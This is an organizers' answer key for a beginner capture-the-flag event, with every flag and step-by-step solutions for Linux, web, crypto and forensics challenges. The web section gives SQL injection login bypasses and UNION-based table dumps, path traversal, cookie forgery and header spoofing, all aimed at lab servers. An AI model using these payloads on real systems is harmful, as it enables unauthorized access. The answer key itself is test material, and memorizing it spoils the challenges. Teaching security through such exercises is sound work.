# STARS CTF answer sheet

Made by Axel Jonas C. Tangalin.

**Organizers only. Don't share this file or show it on screen during the event.**

This is the second orientation's set, named 2nd Star in CTFd: 56 challenges, and every flag is new. The first orientation's 36 are in `classic/ANSWERS.md`, for STARS Classic.

CTFd checks flags automatically. They're case-sensitive, except on the challenges marked *capitals don't matter*, where the flag is read off a picture or decoded as capital letters. So this sheet is for checking challenges and helping players. I solved every one of them as a player would on a full test copy of the CTF, then submitted every flag to a test CTFd.

**Scoring.** Points are dynamic and shared by everyone who solves a challenge:

| Level | Starts at | Each solve takes off | Never below |
|---|---|---|---|
| ★ Easy | 30 | 1 | 15 |
| ★★ Medium | 60 | 3 | 30 |
| ★★★ Hard | 100 | 5 | 50 |

The first team to solve a challenge gets its starting value. After that, every new solve takes points off that challenge for **every** team that has it, so teams' scores can go down while they aren't doing anything. That's expected. A team that solved everything before anyone else would have 2760 points: 490 for each category, and 310 for Scorpius, which has 6 stars instead of 10. With 15 teams, an Easy that everyone solves ends at 16, and a Medium or Hard reaches its floor at the 11th solve.

Every hint costs points, so a team that used them can solve everything and still finish lower. CTFd won't sell a hint that costs more than a team's current score, so a team on 0 points has to solve something first.

**Mission clock.** Players can only see the challenges and submit flags while the mission clock is running. Start it from **Admin Panel > Mission Clock**, and show `http://localhost:8001/timer` on the projector, opened on the CTF PC. See "Mission clock" in README.md.

Each team gets 3 wrong flags per challenge, shared by its members, and a typo counts. After the third, CTFd locks that challenge for the team. To unlock it, delete one of the team's wrong submissions for it in **Admin Panel > Submissions**, then wait a minute before they try again. CTFd also stops a team for a minute if it sends more than 10 wrong flags in a minute.

The commands use `192.168.68.103`. If your IP has changed, use the new one.

## Ursa Minor (Linux)

| Star | Difficulty | Starts at | Password | Flag |
|---|---|---|---|---|
| Pherkad | ★ Easy | 30 | `firstlight` | `STARS{ph3rk4d_f1rst_l1ght}` |
| Polaris | ★ Easy | 30 | `polestar` | `STARS{p0l4r1s_h1d1ng_1n_pl41n_s1ght}` |
| Yildun | ★ Easy | 30 | `littlebear` | `STARS{y1ldun_f0und_1n_th3_4rch1v3}` |
| Alifa | ★ Easy | 30 | `inherited` | `STARS{4l1f4_l1v3s_1n_th3_3nv1r0nm3nt}` |
| Lambda | ★ Easy | 30 | `twocopies` | `STARS{l4mbd4_sp0tt3d_th3_d1ff3r3nc3}` |
| Kochab | ★★ Medium | 60 | `guardians` | `STARS{k0ch4b_m4pp3d_th3_n0rth}` |
| Urodelus | ★★ Medium | 60 | `handlebar` | `STARS{ur0d3lus_h34rd_1t_m0st}` |
| Theta | ★★ Medium | 60 | `perseids` | `STARS{th3t4_c4ught_th3_p3rs31ds}` |
| 11 UMi | ★★ Medium | 60 | `beaconhunt` | `STARS{11um1_b34c0n_kn0ck_kn0ck}` |
| Akhfa | ★★★ Hard | 100 | `dimmerstar` | `STARS{4khf4_p33l3d_3v3ry_l4y3r}` |

Each star starts the same way: log in with `ssh <star>@192.168.68.103 -p 2220`, then enter the password from the table when asked. Nothing shows on screen while you type it. 11 UMi's account is called `umi11`, because Linux names can't start with a number. Run `exit` before moving on to the next star.

Home folders are read-only, so anything that writes a file has to happen in `/tmp`.

### Pherkad

1. Log in: `ssh pherkad@192.168.68.103 -p 2220`
2. List the files with `ls`. You'll see `welcome.txt`.
3. Read it with `cat welcome.txt`. The flag is in it.

### Polaris

Hidden files, two deep this time: a hidden folder with a hidden file inside it.

1. Log in: `ssh polaris@192.168.68.103 -p 2220`
2. List the files with `ls`. You'll only see `README.txt`.
3. Read it with `cat README.txt`. It says some things only show up if you ask to see all of them, and that what you find might be a place you can go into.
4. List everything with `ls -a`. Now the folder `.observatory` appears.
5. Go into it with `cd .observatory`, then `ls`. Only `notes.txt` shows, and it's a decoy.
6. Run `ls -a` again. Now `.pole_record` appears.
7. Read it with `cat .pole_record`. That's the flag.

### Yildun

1. Log in: `ssh yildun@192.168.68.103 -p 2220`
2. List the files with `ls`. You'll only see a folder called `archive`.
3. Locate the record with `find ~ -name star_record.txt`. It prints `/home/yildun/archive/2025/autumn/northern/little-dipper/yildun/star_record.txt`.
4. Read it with `cat` followed by that path. That's the flag.

To teach `cd` and `ls` instead of `find`, walk down one folder at a time: `archive`, `2025`, `autumn`, `northern`, `little-dipper`, `yildun`. The other years, seasons and stars are dead ends.

### Alifa

The flag isn't in any file. The SSH server puts it in an environment variable whenever this account logs in (a `Match User alifa` block with `SetEnv` in the box's sshd settings).

1. Log in: `ssh alifa@192.168.68.103 -p 2220`
2. Read `notes.txt` with `cat notes.txt`. It says the signal isn't stored in any file and is handed to you when you log in.
3. Run `env | grep STARS`. It prints `ALIFA_SIGNAL=STARS{...}`. The part after `=` is the flag.

`env` on its own lists every variable, including decoys such as `DOME_STATE=open` and `CAMERA=allsky-2`.

### Lambda

Two copies of a 2,400-line catalog, and every line has a code that looks like a flag, so `grep STARS` is no help.

1. Log in: `ssh lambda@192.168.68.103 -p 2220`
2. List the files with `ls`: `catalog-old.txt` and `catalog-new.txt`.
3. Compare them with `diff catalog-old.txt catalog-new.txt`. It prints only line 1377:
   ```text
   1377c1377
   < HIP 051949  mag 5.94  code STARS{975b0e314d4bfb761b0e}
   ---
   > HIP 051949  mag 4.07  code STARS{l4mbd4_sp0tt3d_th3_d1ff3r3nc3}
   ```
4. The flag is on the `>` line, which comes from the new file. The `<` line is the old file's decoy.

### Kochab

The challenge says the real chart is exactly 2048 bytes and owned by `cartographer`.

1. Log in: `ssh kochab@192.168.68.103 -p 2220`
2. Look around with `ls charts`. There are 12 folders, `sector-01` to `sector-12`, holding 900 charts between them, and every chart has a `flag:` line.
3. Filter by size and owner with `find ~/charts -type f -size 2048c -user cartographer`, where `c` means bytes. One file is left: `/home/kochab/charts/sector-02/HIP334407.chart`.
4. Pull out the flag line with `grep flag: ~/charts/sector-02/HIP334407.chart`. That's the flag.

Size alone still leaves several files, and so does owner alone, so both filters are needed. Steps 3 and 4 as one command: `grep flag: "$(find ~/charts -type f -size 2048c -user cartographer)"`

### Urodelus

A new trick on last time's log. Every reading is logged 2 to 7 times, and the real flag 11 times. Last time the flag was the reading that appeared only once, so `uniq -u` found it. Now `uniq -u` prints nothing, which is a useful "close but wrong" for returning players.

1. Log in: `ssh urodelus@192.168.68.103 -p 2220`
2. Look at the format with `head -3 sky.log`. Each line is a time, a sensor and a reading.
3. Count each reading and sort by the count:
   ```bash
   cut -d' ' -f3 sky.log | sort | uniq -c | sort -n | tail -3
   ```
   The last line is `11 STARS{ur0d3lus_h34rd_1t_m0st}`. The ones above it have 7.

`sort` has to come before `uniq -c`, because `uniq` only compares neighboring lines. `sort -n` puts the smallest count first, so the answer is at the bottom. `sort -rn | head -1` puts it at the top instead, and `awk '{print $3}' sky.log` works in place of `cut`.

### Theta

365 files with random names, one for each night of 2025, and only one was last changed on 12 August 2025. The names are made fresh every time the SSH box is built, so the name below is only an example.

1. Log in: `ssh theta@192.168.68.103 -p 2220`
2. Filter by date with `ls -l ~/observations | grep 'Aug 12'`. One line is left, ending in a name like `obs-20add55e.log`.
3. Read it with `cat ~/observations/` followed by that name. That's the flag.

`find` gives the same file: `find ~/observations -newermt 2025-08-12 ! -newermt 2025-08-13`. `ls -l` shows the year instead of the time of day because the files are more than six months old.

### 11 UMi

The beacon is a separate container on the CTF's private network. Players' own computers can't reach it, only the SSH box can. It listens on port 4731 and sends the flag to anyone who connects.

1. Log in: `ssh umi11@192.168.68.103 -p 2220`, password `beaconhunt`.
2. Read `notes.txt` with `cat notes.txt`. It says the beacon answers on exactly one port between 4000 and 4999.
3. Scan the range with `nc -zv beacon 4000-4999 2>&1 | grep succeeded`. After a few seconds it prints one line, for port 4731.
4. Connect with `nc beacon 4731`. It prints the flag. Press Ctrl+C to get the prompt back.

Without `| grep succeeded`, `nc` prints a "Connection refused" line for every closed port, which is 999 lines. The `2>&1` is needed because `nc` writes those messages where `grep` can't see them.

### Akhfa

The layers are Base64, gzip, Base64 again, tar and gzip, in a new order from last time. Before each unwrap, run `file` to see what the current layer is.

1. Log in: `ssh akhfa@192.168.68.103 -p 2220`
2. Make a private folder and go into it with `cd "$(mktemp -d)"`. Every team shares this login, so a fixed name like `/tmp/akhfa` could collide with theirs.
3. Undo the Base64:
   ```bash
   file ~/signal.dat              # ASCII text
   base64 -d ~/signal.dat > step1
   ```
4. Undo the first gzip:
   ```bash
   file step1                     # gzip compressed data
   gunzip -c step1 > step2
   ```
5. Undo the second Base64:
   ```bash
   file step2                     # ASCII text again
   base64 -d step2 > step3
   ```
6. Undo the tar. It writes its own file, so check `ls` for the new name:
   ```bash
   file step3                     # POSIX tar archive (GNU)
   tar -xf step3
   ls                             # core.gz has appeared
   ```
7. Undo the last gzip, which prints the flag:
   ```bash
   file core.gz                   # gzip compressed data
   gunzip -c core.gz
   ```

All of it as one command: `base64 -d ~/signal.dat | gunzip | base64 -d | tar -xO | gunzip`

#### Which command unwraps which layer

| `file` says | Command to unwrap it |
|---|---|
| `ASCII text` (random letters, numbers, `+` `/`, often ends in `=`) | `base64 -d IN > OUT` |
| `gzip compressed data` | `gunzip -c IN > OUT` |
| `POSIX tar archive` | `tar -xf IN` then `ls` (the output keeps its own name) |

#### Clues

- Base64 starting with `H4sI` is gzip underneath
- A file name ending in `.gz` or `.tar` tells you the next layer
- Text coming out of a gzip layer is probably another Base64 layer

#### Mistakes to avoid

- Always run `file` on the **newest** layer, not the original
- `gzip` compresses; `gunzip` decompresses
- `tar` doesn't write to `OUT`; check `ls` for the extracted file
- Don't `cat` binary files; run `file` first

## Orion (Web)

| Star | Difficulty | Starts at | Address | Flag |
|---|---|---|---|---|
| Betelgeuse | ★ Easy | 30 | `:8082` | `STARS{b3t3lg3us3_r34d_th3_c0mm3nts}` |
| Bellatrix | ★ Easy | 30 | `:8083` | `STARS{b3ll4tr1x_d1s4ll0w3d_n0_m0r3}` |
| Mintaka | ★ Easy | 30 | `:8084` | `STARS{m1nt4k4_s3rv3r_n3v3r_ch3ck3d}` |
| Hatysa | ★ Easy | 30 | `:8087` | `STARS{h4ty54_r3m3mb3rs_y0u}` |
| Tabit | ★ Easy | 30 | `:8088` | `STARS{t4b1t_bl1nk_4nd_y0u_m1ss_1t}` |
| Rigel | ★★ Medium | 60 | `:8081` | `STARS{r1g3l_c0mm3nt3d_0ut_th3_p4ssw0rd}` |
| Alnilam | ★★ Medium | 60 | `:8085` | `STARS{4ln1l4m_r4nk3d_up_v14_c00k13}` |
| Trapezium | ★★ Medium | 60 | `:8089` | `STARS{tr4p3z1um_cl1mb3d_0ut_0f_th3_f0ld3r}` |
| Horsehead | ★★ Medium | 60 | `:8090` | `STARS{h0rs3h34d_us3r_4g3nt_sp00f3d}` |
| Alnitak | ★★★ Hard | 100 | `:8086` | `STARS{4ln1t4k_un10n_s3l3ct_d33p3r}` |

Open each address in a browser. The `:8082` means `http://192.168.68.103:8082`. In PowerShell, use `curl.exe`, not `curl`, which is a different command there.

### Betelgeuse

1. Open `http://192.168.68.103:8082`.
2. Right-click the page and choose **View page source** (or press Ctrl+U).
3. There are two HTML comments (lines starting `<!--`). The first is a decoy about opening hours. The second is a staff note, and the flag is the archive key inside it.

### Bellatrix

1. Open `http://192.168.68.103:8083`.
2. Add `/robots.txt` to the address: `http://192.168.68.103:8083/robots.txt`. It lists four disallowed pages: `/old-site/`, `/staff-rota/`, `/night-watch/` and `/drafts/`.
3. Open each one. `http://192.168.68.103:8083/night-watch/` has the flag. The other three are decoys.

### Mintaka

A new trick: the **Request vault access** button is switched off with the `disabled` attribute in the page's HTML, and the server never checks whether the button was allowed.

1. Open `http://192.168.68.103:8084`.
2. Right-click the greyed-out button and choose **Inspect**. Developer tools highlight `<button type="submit" disabled>`.
3. Double-click `disabled`, delete it and press Enter. The button turns on.
4. Type any name in the box and click the button. The vault opens and shows the flag.

Without a browser: `curl.exe -d name=me http://192.168.68.103:8084/request` sends the same request and prints the flag. Opening `/request` as a normal page shows nothing, because only the form's POST opens the vault.

### Hatysa

The page's script fetches a visitor pass from `/api/visitor-pass` and saves it in Local Storage without showing it.

1. Open `http://192.168.68.103:8087`.
2. Press F12. Open **Application** (Chrome or Edge) or **Storage** (Firefox), then **Local Storage**, then the site's address.
3. The key `hatysa_visitor_pass` holds the flag.

Other ways in: type `localStorage.getItem("hatysa_visitor_pass")` in the Console, or open `http://192.168.68.103:8087/api/visitor-pass`, which shows the pass as JSON. Players who read the page source find the `fetch` and `localStorage.setItem` lines that point there.

### Tabit

The flag is on the page at `/`, but a `<meta http-equiv="refresh" content="0; url=/closed">` line sends the browser to `/closed` straight away. Ctrl+U shows the source of `/closed`, which has no flag.

1. Type `view-source:http://192.168.68.103:8088/` into the address bar and press Enter. The source view doesn't follow the refresh.
2. The flag is in the page's code, on the line `<p class="key"><code>STARS{...}</code></p>`.

Other ways in: `curl.exe http://192.168.68.103:8088/` prints the same code. Or press F12, open **Network**, tick **Preserve log**, reload, click the first request (`/`) and open its **Response** tab.

### Rigel

The login builds its database query by pasting your text straight in, so your input can change what the query means. There are four accounts: `guest` (clearance 1), `technician` (3), `archivist` (5) and `curator` (7). The key only shows at clearance 7.

1. Open `http://192.168.68.103:8081`.
2. In the **username** box, enter `' OR 1=1 -- ` (with a trailing space after `--`). Put anything in the password box, and submit.
3. You're signed in as `guest`, the first account. The dashboard says the key is restricted to clearance level 7, "which only the head curator has".
4. Sign out. Enter `curator' -- ` as the username, with the trailing space, and submit. The dashboard shows the telescope key.

`' OR clearance=7 -- ` works too. A lone `'` gives a database error, which is the clue that the input reaches the query. The `-- ` comments out the rest of the query, including the password check.

### Alnilam

The site decides your rank from a cookie called `badge`, and players can edit their own cookies. The cookie is Base64 of JSON this time.

1. Open `http://192.168.68.103:8085`. It shows you as a `cadet`.
2. Press F12. Under **Application** > **Cookies** (Firefox: **Storage** > **Cookies**), find `badge`.
3. Decode its value with CyberChef's **From Base64**. It reads `{"name": "guest", "rank": "cadet"}`.
4. Change `cadet` to `commander`, keeping every quote and bracket, and encode it with **To Base64**. That gives `eyJuYW1lIjogImd1ZXN0IiwgInJhbmsiOiAiY29tbWFuZGVyIn0=`.
5. Paste that in as the cookie's value and refresh the page. The dome opens and shows the flag.

Any name works, and JSON without the spaces works too. A value that isn't valid Base64 JSON shows a message saying so, rather than an error page.

### Trapezium

Path traversal. The site opens `?page=` names from `/tmp/trapezium/pages/`, and `flag.txt` sits one folder above.

1. Open `http://192.168.68.103:8089`. The links use addresses like `?page=welcome.txt`.
2. Try a page that doesn't exist: `http://192.168.68.103:8089/?page=nothing.txt`. The error shows the full path, `/tmp/trapezium/pages/nothing.txt`.
3. Go up one folder: `http://192.168.68.103:8089/?page=../flag.txt`. The page shows the flag.

`?page=flag.txt` alone doesn't work, because there's no `flag.txt` in `pages`.

### Horsehead

The archive only opens for the User-Agent `StarScope/2.0`. The page shows the User-Agent your browser sent, so players can see what they're changing.

- **In Chrome or Edge:** press F12, then open the **⋮** menu > **More tools** > **Network conditions**. Under **User agent**, untick **Use browser default**, type `StarScope/2.0`, and refresh with developer tools still open. The archive shows the flag.
- **In PowerShell:** `curl.exe -A "StarScope/2.0" http://192.168.68.103:8090` prints the page with the flag.

In Firefox, the easiest way is `curl.exe`. Without `-A`, curl's own User-Agent is refused too.

### Alnitak

The same injection as Rigel, but there's no login to bypass. The flag is in another table whose name you have to discover first. The search shows 4 columns, so each injected query has to return 4 values. Type each one into the search box, with a trailing space after `--`.

1. Open `http://192.168.68.103:8086` and search for anything, like `Vega`. Count the columns: 4.
2. Confirm the injection with `' UNION SELECT 1, 2, 3, 4 -- `. A row reading 1, 2, 3, 4 appears. With 3 values, the page shows a database error.
3. List the tables:
   ```text
   ' UNION SELECT name, sql, 0, 0 FROM sqlite_master --
   ```
   The results show a table named `archive_b71d` with columns `label` and `secret`.
4. Read that table:
   ```text
   ' UNION SELECT label, secret, 0, 0 FROM archive_b71d --
   ```
   The flag appears in the results as a `secret`.

## Gemini (Crypto)

| Star | Difficulty | Starts at | Flag |
|---|---|---|---|
| Pollux | ★ Easy | 30 | `STARS{p0llux_b4s3_64_d3c0d3d}` |
| Alhena | ★ Easy | 30 | `STARS{4lh3n4_h4lf_th3_symb0ls}` |
| Castor | ★ Easy | 30 | `STARS{c4st0r_sh1ft3d_by_3l3v3n}` |
| Mekbuda | ★ Easy | 30 | `STARS{SIGNAL_IN_THE_STATIC}` (capitals don't matter) |
| Jishui | ★ Easy | 30 | `STARS{TWENTY_SIX_STEPS}` (capitals don't matter) |
| Wasat | ★★ Medium | 60 | `STARS{w4s4t_s1st3r_kn0ws_th3_k3y}` |
| Mebsuta | ★★ Medium | 60 | `STARS{m3bsut4_x0r_tw1c3_1s_n0th1ng}` |
| Geminga | ★★ Medium | 60 | `STARS{g3m1ng4_fr3qu3ncy_4n4lys1s}` (capitals don't matter) |
| Eskimo | ★★ Medium | 60 | `STARS{starwars}` (capitals don't matter) |
| Tejat | ★★★ Hard | 100 | `STARS{t3j4t_gcd_spl1ts_th3_tw1ns}` |

Each one is solved from the file CTFd gives the player to download. Most use [CyberChef](https://gchq.github.io/CyberChef/): paste the file's contents into the **Input** box (top right), drag operations into the **Recipe** column (middle), and read the answer in **Output** (bottom right). The flag is the `STARS{...}` part of the decoded text. I ran every CyberChef recipe below on the real files.

### Pollux

1. Open the downloaded `message.txt` and copy its contents into CyberChef's Input.
2. Drag **From Base64** into the Recipe.
3. The Output reads `POLLUX RELAY, CHANNEL ONE. GOOD EVENING, NEW CREW. FLAG FOLLOWS: STARS{...}`.

### Alhena

A new trick: Base32 instead of Base64. It only uses capital letters, the digits 2 to 7 and `=` padding, and the description says so.

1. Copy the contents of `message.txt` into the Input.
2. Drag **From Base32** into the Recipe.
3. The Output reads `ALHENA RELAY. NOT BASE64 THIS TIME. FLAG FOLLOWS: STARS{...}`.

**From Base64** on this file gives junk, which is the most likely first try.

### Castor

Two layers: hex on the outside, a Caesar shift of 11 inside.

1. Copy `transmission.txt` into the Input.
2. Drag **From Hex** into the Recipe. The Output is still scrambled letters.
3. Drag **ROT13 Brute Force** below it and type `STARS` in its **Crib** box.
4. One line is left: `Amount = 15: GEMINI RELAY, CHANNEL TWO. FLAG FOLLOWS: STARS{...}`. Shifting back 11 is the same as shifting forward 15.

Plain **ROT13** with **Amount** `15` gives the same text without the `Amount = 15:` prefix. ROT13 Brute Force only shows the first 100 characters at each shift, which is why `make_files.py` keeps Castor's message shorter than that.

### Mekbuda

Morse code, one word per line, letters separated by spaces. Morse has no `{`, `}` or `_`, so the description tells players to build the flag themselves from the words after `FLAG WORDS FOLLOW`.

1. Copy `message.txt` into the Input.
2. Drag **From Morse Code** into the Recipe. Its default settings read this file as it is.
3. The Output reads `MEKBUDA RELAY CHANNEL THREE FLAG WORDS FOLLOW SIGNAL IN THE STATIC`.
4. The flag is `STARS{SIGNAL_IN_THE_STATIC}`. Capitals don't matter.

### Jishui

A1Z26: each number is a letter's place in the alphabet, one word per line. The description's clue is that no number is above 26.

1. Open `message.txt`. Decode it with dcode's **Letter Number Code** tool, which does the whole file at once, or by hand (1 is A, 26 is Z).
2. It reads `JISHUI RELAY FLAG WORDS FOLLOW TWENTY SIX STEPS`.
3. The flag is `STARS{TWENTY_SIX_STEPS}`. Capitals don't matter.

CyberChef's **A1Z26 Cipher Decode** works on one line at a time, but drops letters if you give it the whole file at once. The hint says so.

### Wasat

A Vigenère cipher with the keyword `HELEN`. The description gives it as a riddle about the twins' sister, Helen of Troy.

1. Copy `message.txt` into the Input.
2. Drag in **Vigenère Decode** and set the key to `HELEN`. Capitals don't matter here.
3. The Output reads `THE MIDDLE STAR KEEPS THE FAMILY SECRETS. FLAG FOLLOWS: STARS{...}`.

The first hint teaches the other way in, for teams that can't guess the riddle: the five letters just before the `{` are the encrypted `STARS`, so putting only those five through **Vigenère Decode** with key `STARS` outputs `HELEN`. `make_files.py` checks that the letters before the flag are a multiple of 5, which is what makes that trick work.

### Mebsuta

Hex on the outside, a repeating-key XOR underneath, with the key `ZEUS`. The description gives it as a clue: four capital letters, Pollux's father in Greek myth.

1. Copy `message.txt` into the Input and drag in **From Hex**.
2. Drag in **XOR** below it, switch the key's format from Hex to **UTF8**, and type `ZEUS`.
3. The Output reads `STARS{...} END OF MEBSUTA RELAY.`

The key must be in capitals: XOR treats `Z` and `z` as different bytes, so `zeus` gives gibberish. Leaving the format on Hex is the other likely mistake, and the description warns about both.

The first hint teaches the other way in: the message opens with the flag, so XOR with `STARS{` (UTF8) makes the first six characters read `ZEUSZE`, the key starting to repeat. The second hint gives the key and the recipe.

### Geminga

A substitution cipher: every letter swapped for another, the same way all through. About 400 letters of English, long enough for frequency analysis.

1. Copy all of `message.txt` into [quipqiup](https://quipqiup.com/) and press **Solve**.
2. The top answer starts `GEMINGA IS A NEUTRON STAR IN THE CONSTELLATION GEMINI` and ends `THE FLAG FOLLOWS: STARS{G3M1NG4_FR3QU3NCY_4N4LYS1S}`.
3. Capitals don't matter, so that's accepted as it is.

By hand: the five letters before the `{` are `S`, `T`, `A`, `R` and `S`, and the most common letters stand for E, T and A. CyberChef's **Substitute** swaps letters once players have worked some out. I checked that quipqiup's top answer is the whole message, flag included.

### Eskimo

`vault.txt` holds the MD5 hash `5badcaf789d3d1d09794d8f021f40f0e`. MD5 can't be reversed, but common passwords are in lookup tables.

1. Paste the hash into [CrackStation](https://crackstation.net/), tick the robot check and press **Crack Hashes**.
2. It shows `starwars`.
3. The flag is `STARS{starwars}`. Capitals don't matter.

To check a guess, CyberChef's **MD5** turns `starwars` into exactly that hash. CrackStation's robot check stops scripts, so I couldn't test it; try it once in a browser before the event.

### Tejat

RSA where two public keys share a prime, which breaks both. No coding needed: it's two free websites, [Alpertron's calculator](https://www.alpertron.com.ar/ECM.HTM) for the big-number maths and [dcode's RSA Cipher tool](https://www.dcode.fr/rsa-cipher) to decrypt. CyberChef won't do this one. The file gives `n_prior`, `n_tejat`, `e` and `c`. Each `n` is 617 digits, so copy and paste the numbers rather than typing them.

1. Find the shared prime. On Alpertron's calculator, enter `Gcd(n_prior, n_tejat)`, pasting the two numbers in place of the names, and press **Only evaluate**. The result is `p`, a 309-digit prime starting `160563412513`.
2. Find Tejat's other prime. Enter `n_tejat / p`, again pasting the numbers, and press **Only evaluate**. The result is `q`, starting `177192417136`. (Alpertron's `/` is whole-number division, and it divides exactly here.)
3. Decrypt. On dcode's RSA Cipher tool, fill in **C** with `c`, **E** with `65537`, **N** with `n_tejat`, **P** with `p` and **Q** with `q`. Leave the other boxes empty, choose to display the plaintext as a **character string**, and run it.
4. It shows `TEJAT RELAY, SECOND PASS. FLAG FOLLOWS: STARS{...}`.

If dcode asks for `D` instead, get it from Alpertron with `Modinv(65537, (p - 1) * (q - 1))` and fill in **C**, **N** and **D**. Alpertron can also do the whole decryption with `Modpow(c, D, n_tejat)`, but that gives the message as one big number, which still needs a converter to turn it into text.

If you have Python, this does the whole thing at once, which is handy for checking:

```python
import math, re
v = dict(re.findall(r"(\w+)\s*=\s*(\d+)", open("transmission.txt").read()))
n_prior, n_tejat, e, c = (int(v[k]) for k in ("n_prior", "n_tejat", "e", "c"))
p = math.gcd(n_prior, n_tejat)      # the shared prime
q = n_tejat // p
m = pow(c, pow(e, -1, (p - 1) * (q - 1)), n_tejat)
print(bytes.fromhex(hex(m)[2:]).decode())
```

## Lyra (Forensics)

| Star | Difficulty | Starts at | Flag |
|---|---|---|---|
| Sheliak | ★ Easy | 30 | `STARS{sh3l14k_s4ys_ch3ck_th3_m3t4d4t4}` |
| Sulafat | ★ Easy | 30 | `STARS{FIX_THE_MAGIC_BYTES}` (capitals don't matter) |
| Aladfar | ★ Easy | 30 | `STARS{4l4df4r_r3d4ct3d_b4dly}` |
| Ring Nebula | ★ Easy | 30 | `STARS{ONE_FRAME_TOO_FAST}` (capitals don't matter) |
| Kepler-62 | ★ Easy | 30 | `STARS{DOCX_IS_JUST_A_ZIP}` (capitals don't matter) |
| Vega | ★★ Medium | 60 | `STARS{v3g4_c4rr13s_4_st0w4w4y}` |
| Alathfar | ★★ Medium | 60 | `STARS{4l4thf4r_ftp_s3nds_1t_pl41n}` |
| M56 | ★★ Medium | 60 | `STARS{SEE_THE_SOUND}` (capitals don't matter) |
| Zeta Lyrae | ★★ Medium | 60 | `STARS{CARVED_FROM_THE_WIRE}` (capitals don't matter) |
| Double Double | ★★★ Hard | 100 | `STARS{d0ubl3_d0ubl3_gr33n_b1ts}` |

Each one starts from the file CTFd gives the player to download. I checked all ten against the real files with the tools named here, and looked at every picture that has a flag drawn in it.

### Sheliak

The flag is in the PNG's metadata, not the picture.

1. Open the downloaded `sheliak.png` in a plain text editor (Notepad works). It looks like gibberish.
2. Press Ctrl+F and search for `STARS`. If it isn't found, press Ctrl+Home first, because Notepad searches from the cursor.
3. It lands on an observer note: `Observer note. Archive key: STARS{...}`. That's the flag.

### Sulafat

A new trick: the PNG's first 4 bytes, its signature, were wiped to `00 00 00 00`, so nothing will open it.

1. Open `sulafat.png` in [HexEd.it](https://hexed.it/). The first four bytes are `00 00 00 00`, followed by `0D 0A 1A 0A`.
2. A search for "PNG file signature" gives `89 50 4E 47 0D 0A 1A 0A`. Type `89 50 4E 47` over the four zeros.
3. Use **Export** to download the fixed file, and open it in any image viewer. The flag is written on the picture. Capitals don't matter.

### Aladfar

A fake redaction: black boxes drawn over text in the PDF, but the text is still there underneath.

1. Open `aladfar_report.pdf` in your browser.
2. Press Ctrl+A, then Ctrl+C, and paste into Notepad.
3. The line that was under the long black box reads `Archive key: STARS{...}`.

`pdftotext aladfar_report.pdf -` prints the same text.

### Ring Nebula

An animated GIF of 6 frames. Five are shown for 0.4 seconds each, and frame 4 flashes past in 0.02 seconds with the flag on it.

1. Open [ezgif's splitter](https://ezgif.com/split), upload `ring_nebula.gif` and press **Split to frames**.
2. Every frame appears as its own picture, with how long it's shown. The 0.02-second one has the flag. Capitals don't matter.

### Kepler-62

A `.docx` file is a zip archive. The report's picture was taken off the page but left inside the archive, at `word/media/kepler-62f.png`.

1. Rename `kepler-62_report.docx` to `kepler-62_report.zip`. If Windows hides the `.docx`, turn on file name extensions in File Explorer's **View** menu first.
2. Double-click it, then open `word`, then `media`.
3. Open `kepler-62f.png`. The flag is written on it. Capitals don't matter.

7-Zip can open the `.docx` directly, without renaming it. Opening the file in Word shows only the text.

### Vega

The file is bigger than such a dark image should be, because a zip archive is tacked on after the end of the PNG.

1. Confirm there's extra data: `binwalk vega_deep_field.png` lists a Zip archive partway through the file. In a hex editor, the name `vega_log.txt` is readable near the end.
2. Pull the hidden file out: `unzip vega_deep_field.png`. It warns about extra bytes before the zip. That's expected, and it still extracts `vega_log.txt`. On Windows, `tar -xf vega_deep_field.png` in PowerShell does the same.
3. The log's `ARCHIVE KEY` line is the flag.

### Alathfar

A new trick: the capture is an FTP login this time, not HTTP. FTP sends the username and password as plain text.

1. Open `alathfar_capture.pcap` in [Wireshark](https://www.wireshark.org/).
2. Type `ftp` in the filter bar and press Enter.
3. There are two logins as `astronomer`. The first `PASS` is `vega-2025`, and the server replies `530 Login incorrect`. The second `PASS` is the flag, and the server replies `230 User astronomer logged in`.

Command line: `tshark -r alathfar_capture.pcap -Y ftp.request.command==PASS -T fields -e ftp.request.arg` prints both passwords.

### M56

The flag is drawn into the sound's frequencies, so it only shows up in a spectrogram.

1. Open `m56_signal.wav` in [Audacity](https://www.audacityteam.org/).
2. Click the track's name (or the **⋮** menu at its top left) and choose **Spectrogram**.
3. The flag is written across the track, left to right. If it's squashed, make the track taller by dragging its bottom edge down. Capitals don't matter.

Playing it only gives a buzzing sound, which is expected.

### Zeta Lyrae

A web page loaded over plain HTTP. One of the pictures it downloaded, `/staff/zeta_lyrae_tonight.png`, has the flag on it.

1. Open `zeta_lyrae_capture.pcap` in Wireshark.
2. Choose **File > Export Objects > HTTP**. It lists four files: the page (`/`), `style.css`, `images/telescope.png` and `staff/zeta_lyrae_tonight.png`.
3. Save `zeta_lyrae_tonight.png` and open it. The flag is written on it. Capitals don't matter.

The picture arrives in several TCP packets. Export Objects puts them back together, which is the point of the level. Copying one packet's bytes won't work.

### Double Double

Steganography: the flag is hidden one bit at a time in the **green** channel this time (it was red last time, and the red channel is now noise).

1. Open [CyberChef](https://gchq.github.io/CyberChef/) and drop `double_double.png` into the Input.
2. Drag in **Extract LSB** and set **Colour Pattern #1** to `G`. Leave the rest as it is.
3. The flag is at the start of the Output.

With Python and Pillow, read the lowest bit of each pixel's green value, left to right, top to bottom, in groups of 8, highest bit first, and stop at the first all-zero byte:

```python
from PIL import Image
image = Image.open("double_double.png").convert("RGB")
bits = [g & 1 for (r, g, b) in image.getdata()]
out = bytearray()
for i in range(0, len(bits), 8):
    value = int("".join(map(str, bits[i:i + 8])), 2)
    if value == 0:
        break
    out.append(value)
print(out.decode())
```

## Scorpius (Pwn)

| Star | Difficulty | Starts at | Flag |
|---|---|---|---|
| Shaula | ★ Easy | 30 | `STARS{sh4ul4_s3cr3t_m3nu_314}` |
| Sargas | ★ Easy | 30 | `STARS{s4rg4s_b0ught_l3ss_th4n_n0th1ng}` |
| Lesath | ★ Easy | 30 | `STARS{l3s4th_t00_l0ng_f0r_th3_t4g}` |
| Dschubba | ★★ Medium | 60 | `STARS{dschubb4_k3y_h1t_3x4ctly}` |
| Acrab | ★★ Medium | 60 | `STARS{4cr4b_l34k3d_th3_st4ck}` |
| Antares | ★★★ Hard | 100 | `STARS{4nt4r3s_c0r3_c0ll4ps3d}` |

Scorpius has the same 6 programs as the first orientation, with new flags. Only Shaula's program changed: a new tour text and a new hidden menu number. Each program reads its flag from the server when it runs, so the old flags no longer work, but returning players will know the tricks.

